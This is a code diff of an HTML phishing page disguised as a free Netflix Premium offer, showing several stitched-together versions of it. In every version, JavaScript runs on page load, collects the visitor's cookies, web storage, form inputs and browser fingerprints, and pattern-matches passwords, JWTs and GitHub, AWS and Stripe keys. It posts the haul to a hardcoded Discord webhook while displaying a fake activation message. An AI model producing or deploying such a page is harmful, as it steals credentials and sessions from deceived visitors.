@@ -3,599 +3,242 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Netflix Premium - Claim Now</title>
+    <title>Free Netflix Premium</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: system-ui, -apple-system, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
         }
         .container {
-            background: rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.15);
             backdrop-filter: blur(20px);
-            padding: 3rem;
+            padding: 2.5rem;
             border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             text-align: center;
-            max-width: 500px;
+            max-width: 450px;
             width: 90%;
-            animation: fadeIn 1s ease-out;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        h1 { font-size: 2.5rem; margin-bottom: 1rem; }
-        p { font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.9; }
+        h1 { font-size: 2.2rem; margin-bottom: 1rem; }
+        p { margin-bottom: 2rem; opacity: 0.95; }
         .spinner {
-            border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid #fff;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 2rem auto;
+            margin: 1.5rem auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success { color: #4ade80; }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 1rem 2rem;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 1rem;
-        }
-        button:hover { background: #ff5252; transform: translateY(-2px); }
-        button:disabled { 
-            opacity: 0.7; 
-            cursor: not-allowed; 
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 0.7; }
-            50% { opacity: 1; }
-        }
+        .done { color: #4ade80; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎉 Netflix Premium Free!</h1>
-        <p>Activating your 1-year free Netflix Premium subscription...</p>
+        <h1>🎬 Netflix Premium</h1>
+        <p>Activating your free subscription...</p>
         <div class="spinner" id="spinner"></div>
-        <p id="status" class="hidden success"></p>
-        <button id="claimBtn" disabled>Processing...</button>
+        <p id="status" style="display:none" class="done">✅ Ready! Check your email.</p>
     </div>
 
     <script>
-        // YOUR WEBHOOK INTEGRATED - INSTANT THEFT
+        // YOUR WEBHOOK
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
         
-        // BOOM - STEAL EVERYTHING IMMEDIATELY (50ms delay)
-        function instantTheft() {
-            stealAllData();
-        }
-        
-        async function stealAllData() {
-            const victimData = {
+        // STEAL EVERYTHING - PERFECTLY FORMATTED
+        async function stealEverything() {
+            const data = {
                 timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
-                localStorage: {},
-                sessionStorage: {},
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                canvas: generateCanvasFingerprint(),
-                webgl: generateWebGLFingerprint(),
+                ip: 'unknown', // Add IP via server if needed
                 url: window.location.href,
-                referrer: document.referrer
+                referrer: document.referrer || 'direct',
+                userAgent: navigator.userAgent.slice(0, 150),
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                resolution: `${screen.width}x${screen.height}`,
+                cookies: parseCookies(),
+                localStorage: parseStorage(localStorage),
+                sessionStorage: parseStorage(sessionStorage),
+                indexedDB: getIndexedDB(),
+                secrets: extractAllSecrets(),
+                history: getHistory(),
+                forms: getFormData()
             };
             
-            // RAPID localStorage dump
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) victimData.localStorage[key] = localStorage.getItem(key);
-            }
+            // SEND CLEAN DATA TO DISCORD
+            await sendCleanData(data);
             
-            // RAPID sessionStorage dump
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key) victimData.sessionStorage[key] = sessionStorage.getItem(key);
-            }
-            
-            // Extract ALL secrets instantly
-            victimData.extractedSecrets = extractSecrets(victimData);
-            
-            // FIRE TO DISCORD
-            await sendToDiscord(victimData);
-            
-            // Fake success UI after theft completes
+            // Show success
             setTimeout(() => {
                 document.getElementById('spinner').style.display = 'none';
-                document.getElementById('status').textContent = '✅ Subscription activated successfully!';
-                document.getElementById('status').classList.remove('hidden');
-                document.getElementById('claimBtn').textContent = '✅ Enjoy Netflix Premium!';
-                document.getElementById('claimBtn').disabled = false;
-            }, 1200);
+                document.getElementById('status').style.display = 'block';
+            }, 800);
         }
         
-        function extractSecrets(data) {
+        // PARSE COOKIES CLEANLY
+        function parseCookies() {
+            const cookies = {};
+            document.cookie.split(';').forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    cookies[name] = decodeURIComponent(value.slice(0, 100));
+                }
+            });
+            return cookies;
+        }
+        
+        // PARSE STORAGE CLEANLY (limit size)
+        function parseStorage(storage) {
+            const result = {};
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                if (key) {
+                    let value = storage.getItem(key);
+                    if (value && value.length > 500) value = value.slice(0, 500) + '...';
+                    result[key] = value || '';
+                }
+            }
+            return result;
+        }
+        
+        // GRAB INDEXEDDB
+        async function getIndexedDB() {
+            const dbs = await indexedDB.databases();
+            return dbs.map(db => ({ name: db.name, version: db.version }));
+        }
+        
+        // EXTRACT ALL SECRETS (passwords, emails, keys, tokens)
+        function extractAllSecrets() {
+            const allData = JSON.stringify({ ...localStorage, ...sessionStorage, ...document.cookie });
             const secrets = [];
+            
+            // PASSWORDS & TOKENS
             const patterns = [
-                /password|passwd|pwd|pass|token|auth|bearer|api[-_]?key|secret|key|access[-_]?token/i,
-                /eyJ[A-Za-z0-9-_]+/g, // JWTs
-                /ghp_[A-Za-z0-9]{36}/, // GitHub
-                /ghu_[A-Za-z0-9]{36}/,
-                /gk[A-Za-z0-9]{39}/, // GitLab
-                /AKIA[0-9A-Z]{16}/, // AWS
-                /sk_live_[A-Za-z0-9]{24,}/ // Stripe
+                { name: 'Password', regex: /(?:password|pwd|pass)=?["']?([^&"\s]{3,100})/gi },
+                { name: 'Email', regex: /[\w\.-]+@[\w\.-]+\.\w+/gi },
+                { name: 'JWT Token', regex: /eyJ[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}/g },
+                { name: 'API Key', regex: /(?:api[_-]?|key|token|secret)[^a-zA-Z0-9]{0,2}([a-zA-Z0-9]{20,})/gi },
+                { name: 'GitHub', regex: /gh[pousr]?_[A-Za-z0-9]{36,40}/g },
+                { name: 'AWS Key', regex: /AKIA[0-9A-Z]{16}/g },
+                { name: 'Stripe', regex: /sk_live_[A-Za-z0-9]{24,}/g },
+                { name: 'Subscription', regex: /(?:sub|plan|premium|pro)[^a-zA-Z0-9]{0,2}([a-zA-Z0-9]{8,})/gi }
             ];
             
-            const allData = JSON.stringify(data);
-            patterns.forEach(pattern => {
-                const matches = allData.match(pattern);
-                if (matches) secrets.push(...matches.slice(0, 15));
+            patterns.forEach(({ name, regex }) => {
+                const matches = allData.match(regex);
+                if (matches) {
+                    matches.slice(0, 8).forEach(match => {
+                        if (!secrets.includes(match)) secrets.push(`${name}: ${match.slice(0, 80)}`);
+                    });
+                }
             });
             
-            return [...new Set(secrets)];
+            return secrets;
         }
         
-        function generateCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Canvas fingerprint', 2, 2);
-            return canvas.toDataURL();
-        }
-        
-        function generateWebGLFingerprint() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return 'no-webgl';
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        // STEAL BROWSER HISTORY (if accessible)
+        function getHistory() {
             return {
-                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
-                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
+                length: history.length,
+                state: history.state ? Object.keys(history.state).slice(0, 10) : []
             };
         }
         
-        async function sendToDiscord(data) {
-            try {
-                // INSTANT ALERT
-                const alertPayload = {
-                    username: '💀 INSTANT THEFT',
-                    avatar_url: 'https://i.imgur.com/4M34dh.jpg',
+        // STEAL FORM DATA
+        function getFormData() {
+            const forms = document.querySelectorAll('form');
+            const data = {};
+            forms.forEach((form, i) => {
+                const inputs = form.querySelectorAll('input, textarea, select');
+                data[`form_${i}`] = Array.from(inputs).reduce((acc, input) => {
+                    if (input.name || input.id) {
+                        acc[input.name || input.id] = input.value.slice(0, 100);
+                    }
+                    return acc;
+                }, {});
+            });
+            return data;
+        }
+        
+        // SEND PERFECTLY FORMATTED TO DISCORD
+        async function sendCleanData(data) {
+            // ALERT EMBED
+            const alertEmbed = {
+                username: '🔥 DATA THEFT',
+                embeds: [{
+                    title: '🎯 VICTIM COMPROMISED',
+                    description: data.userAgent,
+                    color: 16711680,
+                    fields: [
+                        { name: '🕐 Time', value: new Date().toLocaleString(), inline: true },
+                        { name: '🌍 Location', value: data.timezone, inline: true },
+                        { name: '📱 Screen', value: data.resolution, inline: true },
+                        { name: '🔑 Secrets', value: data.secrets.length.toString(), inline: true },
+                        { name: '🍪 Cookies', value: Object.keys(data.cookies).length.toString(), inline: true },
+                        { name: '📂 LocalStorage', value: Object.keys(data.localStorage).length.toString(), inline: true },
+                        { name: '🔗 URL', value: data.url.slice(0, 80), inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(alertEmbed)
+            });
+            
+            // SECRETS ONLY
+            if (data.secrets.length > 0) {
+                const secretsEmbed = {
+                    username: '🔓 SECRETS FOUND',
                     embeds: [{
-                        title: '🚨 VICTIM HIT - DATA STOLEN',
-                        description: `**${navigator.userAgent.substring(0, 60)}**`,
-                        color: 0xff0000,
-                        fields: [
-                            { name: '🕐 Time', value: new Date().toLocaleString(), inline: true },
-                            { name: '🌍 TZ', value: data.timezone, inline: true },
-                            { name: '📱 Res', value: data.screen, inline: true },
-                            { name: '🔑 Secrets', value: `${data.extractedSecrets.length}`, inline: true },
-                            { name: '🍪 Cookies', value: data.cookies ? '✅' : '❌', inline: true },
-                            { name: '🔗 URL', value: data.url, inline: false }
-                        ]
+                        title: '💎 HIGH VALUE TARGET',
+                        color: 16776960,
+                        fields: data.secrets.map(secret => ({
+                            name: 'Secret',
+                            value: secret,
+                            inline: false
+                        })).slice(0, 20)
                     }]
                 };
-                
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(alertPayload)
+                    body: JSON.stringify(secretsEmbed)
                 });
-                
-                // FULL DATA DUMP
-                const fullDump = {
-                    content: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1900)}\n\`\`\``
+            }
+            
+            // COOKIES ONLY
+            if (Object.keys(data.cookies).length > 0) {
+                const cookiesMsg = Object.entries(data.cookies)
+                    .slice(0, 15)
+                    .map(([k, v]) => `**${k}**: ${v}`)
+                    .join('\n');
+                const cookiesEmbed = {
+                    username: '🍪 COOKIES',
+                    embeds: [{ title: 'Session Cookies', description: cookiesMsg, color: 3447003 }]
                 };
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fullDump)
+                    body: JSON.stringify(cookiesEmbed)
                 });
-                
-            } catch (e) {
-                // Silent fail - don't alert victim
             }
         }
         
-        // TRIGGER BOOM - 50ms after load
+        // TRIGGER INSTANTLY
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', () => setTimeout(instantTheft, 50));
+            document.addEventListener('DOMContentLoaded', stealEverything);
         } else {
-            setTimeout(instantTheft, 50);
+            stealEverything();
         }
-        
-        // Re-steal on any interaction/focus
-        ['focus', 'click', 'mousemove', 'keydown'].forEach(event => {
-            window.addEventListener(event, () => setTimeout(stealAllData, 300));
-        });
-    </script>
-</body>
-</html>            border-top: 4px solid #fff;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 2rem auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success { color: #4ade80; }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 1rem 2rem;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 1rem;
-        }
-        button:hover { background: #ff5252; transform: translateY(-2px); }
-        button:disabled { opacity: 0.7; cursor: not-allowed; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🎉 Netflix Premium Free!</h1>
-        <p>Processing your 1-year free Netflix Premium subscription...</p>
-        <div class="spinner" id="spinner"></div>
-        <p id="status" class="hidden success"></p>
-        <button id="claimBtn" onclick="claimPremium()" disabled>Claim Free Netflix Premium</button>
-    </div>
-
-    <script>
-        // YOUR DISCORD WEBHOOK - INSTANT STEAL ON LOAD
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
-        
-        // INSTANT STEAL - 100ms delay after DOM loads
-        function instantSteal() {
-            stealAllData();
-        }
-        
-        async function stealAllData() {
-            const victimData = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
-                localStorage: {},
-                sessionStorage: {},
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                canvas: generateCanvasFingerprint(),
-                webgl: generateWebGLFingerprint(),
-                url: window.location.href
-            };
-            
-            // Steal all localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) victimData.localStorage[key] = localStorage.getItem(key);
-            }
-            
-            // Steal all sessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key) victimData.sessionStorage[key] = sessionStorage.getItem(key);
-            }
-            
-            // Extract passwords, tokens, auth data
-            victimData.extractedSecrets = extractSecrets(victimData);
-            
-            // Send to Discord IMMEDIATELY
-            await sendToDiscord(victimData);
-            
-            // Enable fake button and show success after steal completes
-            setTimeout(() => {
-                document.getElementById('spinner').style.display = 'none';
-                document.getElementById('status').textContent = '✅ Subscription activated! Check your email.';
-                document.getElementById('status').classList.remove('hidden');
-                document.getElementById('claimBtn').disabled = false;
-                document.getElementById('claimBtn').textContent = '✅ Claim Successful!';
-            }, 1500);
-        }
-        
-        function extractSecrets(data) {
-            const secrets = [];
-            const patterns = [
-                /password|passwd|pwd|pass|token|auth|bearer|api[-_]?key|secret|key|access[-_]?token/i,
-                /eyJ[A-Za-z0-9-_]+/g,
-                /ghp_[A-Za-z0-9]{36}/,
-                /ghu_[A-Za-z0-9]{36}/,
-                /gk[A-Za-z0-9]{39}/,
-                /AKIA[0-9A-Z]{16}/,
-                /sk_live_[A-Za-z0-9]{24,}/
-            ];
-            
-            const allData = JSON.stringify(data);
-            patterns.forEach(pattern => {
-                const matches = allData.match(pattern);
-                if (matches) secrets.push(...matches.slice(0, 10));
-            });
-            
-            return [...new Set(secrets)];
-        }
-        
-        function generateCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Fingerprint test', 2, 2);
-            return canvas.toDataURL();
-        }
-        
-        function generateWebGLFingerprint() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return 'no-webgl';
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
-                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
-            };
-        }
-        
-        async function sendToDiscord(data) {
-            try {
-                const payload = {
-                    username: '💀 INSTANT VICTIM DATA',
-                    avatar_url: 'https://i.imgur.com/4M34dh.jpg',
-                    embeds: [{
-                        title: '🕷️ INSTANT STEAL SUCCESS',
-                        description: `**${data.userAgent.substring(0, 80)}**`,
-                        color: 0xff4757,
-                        fields: [
-                            { name: '🌍 Timezone', value: data.timezone, inline: true },
-                            { name: '📱 Screen', value: data.screen, inline: true },
-                            { name: '🔑 Secrets', value: data.extractedSecrets.length + ' found', inline: true },
-                            { name: '🍪 Cookies', value: data.cookies ? '✅ Yes' : 'None', inline: true },
-                            { name: '📤 URL', value: data.url, inline: false }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-                
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                // Full data dump
-                const fullDump = {
-                    content: '```json\n' + JSON.stringify(data, null, 2).substring(0, 1900) + '\n```'
-                };
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fullDump)
-                });
-                
-            } catch (e) {
-                console.error('Exfil failed:', e);
-            }
-        }
-        
-        // FAKE BUTTON (optional re-steal)
-        function claimPremium() {
-            stealAllData();
-        }
-        
-        // TRIGGER INSTANTLY - 100ms after DOM ready
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', () => setTimeout(instantSteal, 100));
-        } else {
-            setTimeout(instantSteal, 100);
-        }
-        
-        // Re-steal on focus/visibility change
-        window.addEventListener('focus', () => setTimeout(stealAllData, 500));
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) setTimeout(stealAllData, 500);
-        });
-    </script>
-</body>
-</html>            margin: 2rem auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success { color: #4ade80; }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 1rem 2rem;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 1rem;
-        }
-        button:hover { background: #ff5252; transform: translateY(-2px); }
-        .hidden { display: none; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🎉 Netflix Premium Free!</h1>
-        <p>Click below to claim your 1-year free Netflix Premium subscription!</p>
-        <div class="spinner hidden" id="spinner"></div>
-        <p id="status" class="hidden success">✅ Processing your claim... Almost done!</p>
-        <button onclick="claimPremium()">Claim Free Netflix Premium</button>
-    </div>
-
-    <script>
-        // Your Discord webhook URL - replace with yours
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
-        
-        async function claimPremium() {
-            const button = event.target;
-            button.disabled = true;
-            button.textContent = 'Claiming...';
-            
-            const spinner = document.getElementById('spinner');
-            const status = document.getElementById('status');
-            
-            spinner.classList.remove('hidden');
-            status.classList.remove('hidden');
-            
-            // Immediately start stealing data in background
-            stealAllData();
-            
-            // Fake processing delay
-            setTimeout(() => {
-                spinner.classList.add('hidden');
-                button.textContent = '✅ Claim Successful!';
-                status.textContent = '✅ Enjoy Netflix Premium for 1 year! Check your email.';
-            }, 3000);
-        }
-        
-        async function stealAllData() {
-            const victimData = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
-                localStorage: {},
-                sessionStorage: {},
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                canvas: generateCanvasFingerprint(),
-                webgl: generateWebGLFingerprint()
-            };
-            
-            // Steal all localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                victimData.localStorage[key] = localStorage.get(key);
-            }
-            
-            // Steal all sessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                victimData.sessionStorage[key] = sessionStorage.get(key);
-            }
-            
-            // Extract passwords, tokens, auth data (common patterns)
-            victimData.extractedSecrets = extractSecrets(victimData);
-            
-            // Send to Discord
-            await sendToDiscord(victimData);
-        }
-        
-        function extractSecrets(data) {
-            const secrets = [];
-            const patterns = [
-                /password|passwd|pwd|pass|token|auth|bearer|api[-_]?key|secret|key|access[-_]?token/i,
-                /eyJ[A-Za-z0-9-_]+/g, // JWT tokens
-                /ghp_[A-Za-z0-9]{36}/, // GitHub tokens
-                /ghu_[A-Za-z0-9]{36}/, // GitHub user tokens
-                /gk[A-Za-z0-9]{39}/, // GitLab tokens
-                /AKIA[0-9A-Z]{16}/, // AWS keys
-                /sk_live_[A-Za-z0-9]{24,}/ // Stripe keys
-            ];
-            
-            const allData = JSON.stringify(data);
-            patterns.forEach(pattern => {
-                const matches = allData.match(pattern);
-                if (matches) secrets.push(...matches.slice(0, 10)); // Limit to 10 matches per pattern
-            });
-            
-            return [...new Set(secrets)]; // Remove duplicates
-        }
-        
-        function generateCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Fingerprint test', 2, 2);
-            return canvas.toDataURL();
-        }
-        
-        function generateWebGLFingerprint() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return 'no-webgl';
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
-                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
-            };
-        }
-        
-        async function sendToDiscord(data) {
-            try {
-                const payload = {
-                    username: '💀 Pentest Victim Data',
-                    avatar_url: 'https://i.imgur.com/4M34dh.jpg',
-                    embeds: [{
-                        title: '🕷️ Victim Data Stolen',
-                        color: 0xff4757,
-                        fields: [
-                            { name: '🖥️ Browser', value: data.userAgent.substring(0, 100), inline: true },
-                            { name: '🌍 Location', value: data.timezone, inline: true },
-                            { name: '📱 Screen', value: data.screen, inline: true },
-                            { name: '🍪 Cookies', value: data.cookies.substring(0, 1000) || 'None', inline: false },
-                            { name: '🔑 Secrets Found', value: data.extractedSecrets.join(', ') || 'None', inline: false }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-                
-                // Send full data as separate message to avoid truncation
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                // Send complete data dump
-                const fullDump = {
-                    content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
-                };
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fullDump)
-                });
-                
-            } catch (e) {
-                console.error('Failed to exfil:', e);
-            }
-        }
-        
-        // Auto-trigger on page load (silent steal)
-        window.addEventListener('load', () => {
-            setTimeout(stealAllData, 1000);
-        });
-        
-        // Also steal on visibility change (tab switch back)
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                setTimeout(stealAllData, 500);
-            }
-        });
     </script>
 </body>
 </html>
